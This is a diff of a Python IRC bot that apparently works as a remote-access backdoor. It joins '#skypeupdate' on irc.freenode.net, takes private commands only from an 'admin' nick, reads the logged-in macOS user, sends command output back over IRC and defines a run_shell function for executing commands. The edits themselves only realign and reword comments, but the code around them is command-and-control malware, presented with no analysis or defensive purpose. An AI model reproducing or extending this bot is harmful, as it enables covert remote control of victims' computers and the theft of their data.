@@ -14,9 +14,9 @@ from subprocess import Popen, PIPE, STDOUT
 from time import strftime, sleep
 from StringIO import StringIO
 
-version = "2.0.2"                                                   # bot version
+version = "2.0.2"                                                 # bot version
 
-def log(prefix, content=''):                                        # function used to log things to the console with a timestamp
+def log(prefix, content=''):                                      # function used to log things to the console with a timestamp
     try:
         for line in content.split('\n'):
             print('[%s] %s%s' % (strftime("%Y-%m-%d %H:%M:%S"), prefix, line))
@@ -30,7 +30,7 @@ log("[*] IRC BOT v%s" % version)
 server = 'irc.freenode.net'
 port = 6667
 channel = '#skypeupdate'
-admin = 'thesquash'                                                 # the nick to send privmsgs to
+admin = 'thesquash'                                               # the nick to send privmsgs to
 
 hostname = socket.gethostname()
 main_user = os.popen("stat -f '%u %Su' /dev/console | awk  '{print $2}'").read().strip()
@@ -64,7 +64,7 @@ Public Commands (main channel): \n
 def handler(signum, frame):                                       # handler for timeout exceptions
     raise Exception("timedout")
 
-def line_split(seq, n):                                           # if output is multiline, split based on \n and max IRC message length (480)
+def line_split(seq, n):                                           # if output is multiline, split based on \n and max chars per line (n)
     output = []
     if (seq.find('\n') == -1):
         output.append(seq)
@@ -82,7 +82,7 @@ def line_split(seq, n):                                           # if output is
 ############ IRC functions
 
 def scan(match):                                                  # function to scan main channel messages for strings
-    if data.find(channel) != -1 and not data.find(nick) != -1:     # checking to make sure its not a private message
+    if data.find(channel) != -1 and not data.find(nick) != -1:    # checking to make sure its not a private message
         return data.find(match) != -1
     else:
         return False
@@ -90,18 +90,18 @@ def scan(match):                                                  # function to 
 def privscan(match):                                              # function to scan private messages to the bot for strings
     if data.find('PRIVMSG %s :%s' % (nick, match)) != -1:
         header = data.split("PRIVMSG")[0]
-        return header.find(':%s!' % admin) != -1                    # checks to make sure private message is from admin
+        return header.find(':%s!' % admin) != -1                  # checks to make sure private message is from admin
 
 def privmsg(msg=None, to=admin):                                  # function to send a private message to a user, defaults to master of bots!
     log('[+] Sent Data:')
     msg = str(msg)
     if (len(msg) > 480) or (msg.find('\n') != -1):
         log('[#] Starting multiline output.')
-        msgs = line_split(msg, 480)
+        msgs = line_split(msg, 480)                               # use line_split to split output into multiple lines based on max message length (480)
         total = len(msgs)
         for num, line in enumerate(msgs):
             log('[<]    PRIVMSG %s :[%s/%s] %s\r' % (to, num+1, total, line))
-            irc.send ('PRIVMSG %s :[%s/%s] %s\r\n' % (to, num+1, total, line))
+            irc.send ('PRIVMSG %s :[%s/%s] %s\r\n' % (to, num+1, total, line))      # [1/10] Output line 1 out of 10 total
             sleep(1)
         log('[#] Finished multiline output.')  
     else:
@@ -111,7 +111,7 @@ def privmsg(msg=None, to=admin):                                  # function to 
 def broadcast(msg):                                               # function to send a message to the main channel
     privmsg(msg, channel)
 
-############ keyword functions
+############ Keyword functions
 
 def run_shell(cmd, timeout=60, verbose=False):                    # verbose enables live command output via yield
    out = ''
